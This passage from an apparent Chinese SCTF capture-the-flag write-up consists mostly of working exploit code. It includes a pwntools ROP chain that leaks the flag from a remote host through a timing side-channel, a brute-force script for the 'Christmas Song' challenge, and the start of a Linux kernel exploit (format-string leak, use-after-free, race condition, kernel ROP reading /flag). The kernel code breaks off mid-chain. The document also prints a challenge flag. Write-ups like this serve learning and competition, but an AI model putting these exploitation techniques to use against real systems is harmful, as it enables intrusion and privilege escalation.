        pop_rdi_pop_ret = 0x401734
        pop_rsi_pop_pop_ret = 0x0000000000401732
        pop_rsp_pop_pop_pop_ret = 0x0000000000401730
        pop_rcx_ret = 0x000000000040117b
        pop_rbx_pop_pop_pop_ret = 0x403072
        pop_r13_pop_pop_pop_ret=  0x000000000040288f
        mov_sys = 0x401170 
        int80_ret = 0x4011f3
        retfq_addr = 0x4011ec
        payload = "a" * 48
        payload +=p64(fake_stack)
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(fake_stack)
        payload +=p64(fake_stack)
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(fake_stack)
        payload +=p64(fake_stack)
        payload +=p64(mov_sys)
        payload +=p64(pop_rsp_pop_pop_pop_ret)
        payload +=p64(fake_stack-0x10)
        p.send(payload.ljust(0xc0,"\x00"))
        payload = "./flag".ljust(8,"\x00")
        payload += p64(pop_rbx_pop_pop_pop_ret)
        payload += p64(fake_stack)
        payload += p64(0)*3
        payload += p64(pop_rcx_ret)
        payload += p64(0)
        payload += p64(pop_rax_ret)
        payload += p64(5)
        payload += p64(retfq_addr)
        payload += p32(int80_ret)
        payload += p32(0)
        payload += p64(0x23)
        payload += p32(retfq_addr+1)
        payload += p32(0x401002)
        payload += p32(0x33)
        payload += p64(pop_rax_ret)
        payload += p64(0)
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(fake_stack+0x400)
        payload +=p64(fake_stack+0x400)
        payload +=p64(mov_sys)
        payload +=p64(pop_rsp_pop_pop_pop_ret)
        payload +=p64(fake_stack+0x400-0x18)
        p.send(payload.ljust(0xc0,"\x00"))
        payload =p64(pop_rsi_pop_pop_ret)
        payload +=p64(0x40db30-num+1)+p64(fake_stack)*2
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(3)+p64(fake_stack)
        payload +=p64(pop_rax_ret)
        payload +=p64(0)
        payload +=p64(0x401165)#---read
        payload +=p64(0)
        payload +=p64(pop_rsi_pop_pop_ret)
        payload +=p64(fake_stack+0x500)+p64(fake_stack)*2
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(0)+p64(fake_stack)
        payload +=p64(pop_rax_ret)
        payload +=p64(0)
        payload +=p64(0x401195)#---read
        payload +=p64(0)
        payload +=p64(pop_rsp_pop_pop_pop_ret)
        payload +=p64(fake_stack+0x500-0x18)
        p.send(payload.ljust(0xc0,"\x00"))
        payload =p64(pop_rsi_pop_pop_ret)
        payload +=p64(0x40db31)+p64(fake_stack)*2
        payload +=p64(pop_rdi_pop_ret)
        payload +=p64(0)*2
        payload +=p64(pop_rax_ret)#
        payload +=p64(0)
        payload +=p64(0x401165)#---read
        payload +=p64(0)
        payload +=p64(pop_r13_pop_pop_pop_ret)
        payload +=p64(flag_ord)+p64(0x40d560)*3
        payload +=p64(pop_rax_ret)
        payload +=p64(0x40db18)
        payload +=p64(pop_rax_ret)
        payload +=p64(0x40db18)
        payload +=p64(0x401002)*3
        payload +=p64(0x402D19)
        print "payload = ",hex(len(payload))
        #gdb.attach(p,"b *0x402D19")
        p.send(payload)
        p.sendline("\x00"*0x20)
        #p.interactive()
        start = time.time()
        p.can_recv_raw(timeout = 3)
        end = time.time()
        if end - start > 3:
            print "flag[", str(num)+"]= ",chr(flag_ord+1)
            return 1
        else:
            return 0
    if __name__ == '__main__':
        flag = ""
        for num in range(1,40):
            for i in range(126,32,-1):
                #p = process('./gadget')
                p = remote('121.37.135.138',2102)
                if pwn(p,num,i):
                    flag = flag + chr(i+1)
                    print "flag = ",flag
                    break
                p.close()
            print "flag[",str(num),"]"
    #SCTF{woww0w_y0u_1s_g4dget_m45ter}
flag实在太长了，我一次又一次降低我的底线
###  Christmas Song
    from pwn import * 
    import string 
    context.log_level = 'debug' 
    io = remote('124.71.144.133', 2144) 
    s = lambda data :io.send(data) 
    sa = lambda data1,data :io.sendafter(data1, data)
    sl = lambda data :io.sendline(data) 
    sla = lambda data1,data :io.sendlineafter(data1, data) 
    r = lambda numb=4096 :io.recv(numb)
    ru = lambda data1, drop=True :io.recvuntil(data1, drop)
    rn = lambda numb :io.recvn(numb)
    irt = lambda :io.interactive()
    # misc functions
    uu32 = lambda data :u32(data.ljust(4, b'\0'))
    uu64 = lambda data :u64(data.ljust(8, b'\0'))
    leak = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
    io.close()
    prefix = 'SCTF{'
    index = 6
    stringset = string.printable
    while True:
    for i in stringset:
    teststr = prefix + i
    #io = remote('124.71.144.133', 2144)
    io=process("python3 server.py".split(" "))
    c=""
    c+="gift tmp is 0;\n"
    c+="gift foo is 30;\n"
    c+="gift fd is 0;\n"
    c+="gift buff is \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";\n"
    c+="gift path is \"/home/ctf/flag\";\n"
    c+="gift teststr is \"{0}\";\n".format(teststr)
    c+="gift result is 1;\n"
    c+="gift index is {0};\n".format(index)
    c+="reindeer Dancer delivering gift path tmp tmp brings back gift fd;\n"
    c+="reindeer Dasher delivering gift fd buff foo;\n"
    c+="reindeer Prancer delivering gift buff teststr index brings bac k gift result;\n"
    c+="this family wants gift result if the gift is result equal to t mp : reindeer Rudolph delivering gift fd buff foo;\n"
    c+="ok, they should already have a gift;\n"
    c+="EOF\n"
    ru('(EOF to finish):')
    s(c)
    try :
    io.recvuntil('error:')
    except EOFError:
    io.close()
    else:
    prefix =teststr
    index += 1
    io.close()
    break
###  flying_kernel
格式化字符串泄露kernel地址
uaf劫持subprocess_info结构体
条件竞争劫持cleanup指针进行ROP
内核文件读写输出flag
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    size_t kernel_base,pop_rdi,filp_open,vfs_read,pop_rdx,pop_rsi,pop_rcx,xchg_eax_esp;
    size_t buf[0x10];
    void gadget()
    {
        pop_rdi=kernel_base+0x16e9;
        pop_rdx=kernel_base+0x4abb7;
        pop_rsi=kernel_base+0x2568;
        pop_rcx=kernel_base+0x1ed83;
        filp_open=kernel_base+0x1dc160;
        vfs_read=kernel_base+0x1dfc10;
        xchg_eax_esp=kernel_base+0x11cb0;
        memset(buf,0,sizeof(buf));
        buf[1]=xchg_eax_esp;
    }
    void *thread(void *thread_arg)
    {
        clock_t start=clock();
        while (1)
        {
            write(*(int *)thread_arg,(char *)buf,0x30);
            if (clock()-start>=CLOCKS_PER_SEC*0.5) break;
        }
    }
    void *thread_leak(void *thread_arg)
    {
        while (1)
        {
            puts((char *)thread_arg);
        }
    }
    char *ROP()
    {
        size_t *user_page=mmap((void *)(xchg_eax_esp&0xFFFFF000),0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
        int i=0x196;
        user_page[i++]=pop_rdi;
        user_page[i++]=(size_t)(user_page-0x10);
        user_page[i++]=kernel_base+0x6892f8;
        user_page[i++]=pop_rdi;
        user_page[i++]=(size_t)"/flag";
        user_page[i++]=pop_rsi;
        user_page[i++]=0;
        user_page[i++]=pop_rdx;
        user_page[i++]=0;
        user_page[i++]=filp_open;
        user_page[i++]=kernel_base+0x65afac;
        user_page[i++]=pop_rsi;
        user_page[i++]=(size_t)user_page;